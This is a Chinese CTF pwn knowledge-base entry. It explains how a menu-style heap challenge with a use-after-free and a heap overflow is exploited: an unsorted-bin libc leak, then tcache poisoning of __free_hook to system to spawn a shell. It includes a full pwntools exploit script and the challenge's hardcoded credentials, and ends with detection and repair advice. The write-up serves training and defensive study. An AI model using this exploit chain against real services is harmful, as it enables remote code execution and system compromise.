---
id: ctf-pwn-menu-uaf-heap-overflow-tcache-poison-freehook-system
title: 菜单堆题 UAF + 堆溢出：unsortedbin 泄 libc 后 tcache 投毒 __free_hook 为 system
type: scenario
domain: ctf
path: ctf/pwn
technique: menu-uaf-heap-overflow-tcache-poison-freehook
tags:
- ctf
- pwn
- heap
- uaf
- heap-overflow
- unsorted-bin
- tcache
- free-hook
- glibc-2.31
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V203
  verified_at: '2026-11-07T02:17:15+08:00'
  notes: 已对照原文核对：auth_gate XOR admin 解出 guest/12345、delete UAF、edit 堆溢出、0x430 unsortedbin 泄 libc(偏移 0x1ECBE0)、0x90 tcache 投毒 __free_hook->system、free('/bin/sh')，与原文 IDA/exp 一致。未验证点：未本机复跑；原文无受影响版本；frontmatter 无 sources/source_url。
url: /docs/ctf/pwn/ctf-pwn-menu-uaf-heap-overflow-tcache-poison-freehook-system/
draft: false
kb_aliases:
- restaurant 堆题
- UAF delete 不置空
- edit 堆溢出
- unsortedbin 泄 libc
- tcache 投毒 free_hook
- __free_hook system
---

## 一句话结论

菜单式堆题中 `delete` 只 `free` 不置空指针（UAF）、`edit` 允许重新输入长度并写入超过原块大小的数据（堆溢出）；先释放 0x430 大块进 unsorted bin，用 show 读 fd 泄露 libc，再用 edit 覆盖相邻空闲块的 fd 把 tcache 投毒到 `__free_hook`，写入 `system` 后 free 一个内容为 `/bin/sh` 的块即可 getshell。

## 原理

- **UAF**：`delete_content` 取 `menu_items[num]` 后直接 `free`，但不把数组项置空；`show_content` 仍可打印该悬空块的内容，`edit_content` 仍可向该块写入。这给“释放后读/写”两个原语。
- **unsortedbin 泄 libc**：申请一个大于 tcache 上限（本例 0x430，chunk size 0x440）的块并释放，它会进入 unsorted bin；其 `fd/bk` 指向 `main_arena` 附近的 libc 地址。用 show 读取该块前 8 字节，减去对应 libc 偏移（本例 `0x1ECBE0`，glibc 2.31）即得 `libc_base`。
- **堆溢出**：`edit_content` 让用户重新输入“dish name length”，并 `read(0, chunk_ptr, size-1)` 写入原块；长度没有与原分配大小比较，因此可越过当前块写入下一个块的 `prev_size/size/fd`。
- **tcache 投毒**：构造 `0x88` 请求（chunk size 0x90）的两个块 1、3 并释放，使 0x90 tcache bin 有 1←3；用 edit(2) 溢出覆盖块 3 的 fd 为 `__free_hook`。随后两次 `add(0x88)`：第一次取回块 3，第二次返回 `__free_hook`；向该块写 `p64(system)`，再让程序 free 一个内容为 `/bin/sh` 的块，`free` 调用被劫持为 `system("/bin/sh")`。
- **认证门**：程序启动的 `auth_gate` 用 XOR（key=`admin`）解密硬编码的 `encrypted_user/pass` 后比较；这只是静态凭据混淆，逆向脚本解出 `guest/12345` 即可登录，不属于可利用漏洞。

## 触发条件

- 菜单程序提供 add/delete/edit/show，delete 后指针不置空，edit 的长度可超过原分配大小。
- glibc 2.31 等带 tcache 且 `__free_hook` 仍可用的版本（2.34 起 hook 被移除）。
- 能申请大于 tcache 上限的块触发 unsorted bin，并有 show 功能读取 freed chunk。
- 二进制无 Full RELRO 限制 free_hook 写入（本例直接写 libc 数据段，不受 RELRO 影响）；PIE/ASLR 下需先泄 libc。
- 已知题目 libc 版本（用于 fd 偏移与 `system` 偏移）。

## 利用步骤

1. 逆向 `auth_gate`，按 XOR key `admin` 解出 `guest/12345` 登录；确认 add/delete/edit/show 的参数与索引。
2. `add(0, 0x430)`、`add(1, 0x88)`，`free(0)` 让大块进 unsorted bin；`show(0)` 读前 8 字节 fd，`libc_base = leak - 0x1ECBE0`（按题目 libc 调整）。
3. `add(2, 0x88)`、`add(3, 0x88)`，`free(1)`、`free(3)`，使 0x90 tcache bin 形成 `1 ← 3`。
4. `edit(2, 0x100, b"a"*0x88 + p64(0x90) + p64(free_hook))`：溢出覆盖块 3 的 size/fd，把 tcache 链的下一项改成 `__free_hook`。
5. `add(4, 0x88)` 取回块 3；`add(5, 0x88)` 返回 `__free_hook`；`edit(4, 0x88, b"/bin/sh\x00")`，`edit(5, 0x88, p64(system))`。
6. `free(4)` 触发 `__free_hook("/bin/sh")` → `system("/bin/sh")`，拿 shell 后读 flag。

## PoC

```python
from pwn import *
context(arch='amd64', log_level='debug')
p = process('./restaurant')
elf = ELF('./restaurant')
libc = ELF('./libc.so.6')          # glibc 2.31

p.sendlineafter(b"Username:", b"guest")
p.sendlineafter(b"Password", b"12345")

def add(idx, size):
    p.sendlineafter(b"root@iscc:~/Desktop#", b"1")
    p.sendlineafter(b"Enter table number:", str(idx).encode())
    p.sendlineafter(b"Enter dish name length:", str(size).encode())

def free(idx):
    p.sendlineafter(b"root@iscc:~/Desktop#", b"2")
    p.sendlineafter(b"Enter table number:", str(idx).encode())

def edit(idx, size, data):
    p.sendlineafter(b"root@iscc:~/Desktop#", b"3")
    p.sendlineafter(b"Enter table number:", str(idx).encode())
    p.sendlineafter(b"Enter dish name length:", str(size).encode())
    p.sendafter(b"Enter new dish name:", data)

def show(idx):
    p.sendlineafter(b"root@iscc:~/Desktop#", b"4")
    p.sendlineafter(b"Enter table number:", str(idx).encode())

add(0, 0x430); add(1, 0x88)
free(0); show(0)
libc_base = u64(p.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00")) - 0x1ECBE0
free_hook = libc_base + libc.sym['__free_hook']
system = libc_base + libc.sym['system']

add(2, 0x88); add(3, 0x88)
free(1); free(3)
edit(2, 0x100, b"a"*0x88 + p64(0x90) + p64(free_hook))
add(4, 0x88); add(5, 0x88)
edit(4, 0x88, b"/bin/sh\x00")
edit(5, 0x88, p64(system))
free(4)
p.interactive()
```

## 变体与关联

- 变体：无 `edit` 堆溢出时可用 UAF double-free 投毒 tcache；无 `__free_hook`（glibc 2.34+）时改打 `__malloc_hook`/`_IO_list_all`/FSOP 或 `setcontext`。
- 变体：若 unsorted bin 泄漏被限制，可用 tcache/chunk 残留、`puts@got` 或栈上返回地址泄露 libc。
- 关联：[[ctf-pwn-format-canary-uaf-unsorted-ret2libc-all-protections]]（UAF+unsorted+ret2libc）、[[binary-pwn-heap-freehook-setcontext61-bridge-orw]]（free_hook 到 ORW 的桥接）、[[binary-pwn-heap-calloc-tcache-overlap-realloc-hook-onegadget]]（tcache 重叠写 hook）。
- 边界：`__free_hook` 在 glibc 2.34 被移除；tcache 投毒需绕过 safe-linking（2.32+）或先泄堆地址；edit 长度若被校验则溢出原语不成立。

## 检测与防御

- 检测（CTF）：delete 后 show 仍能打印、edit 可改已释放块、长度字段可超原大小；unsorted bin fd 的页对齐与 libc 偏移匹配。
- 修复：`free` 后把 `menu_items[idx]` 置 `NULL`；edit 时校验新长度不超过原分配大小；show 前校验块仍有效；升级 glibc 或禁用 tcache 调试。
- 加固：开启 Full RELRO/PIE/Canary；对堆操作封装分配器并记录块大小，禁止跨块写。
